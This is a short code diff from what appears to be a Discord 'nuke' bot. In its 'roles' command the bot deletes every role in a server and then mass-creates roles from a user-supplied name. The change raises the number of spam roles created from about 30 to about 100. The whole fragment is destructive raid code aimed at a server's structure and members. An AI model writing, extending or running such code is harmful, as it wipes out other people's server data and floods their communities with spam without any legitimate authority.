@@ -149,7 +149,7 @@ async def roles(ctx, *, arg):
                 await role.delete()
             except:
                 print(color.RED + f"[!] Failed to delete {role.name}")
-        x = 30
+        x = 100
         guild = ctx.guild
         while x >= 0:
             await guild.create_role(name=arg)
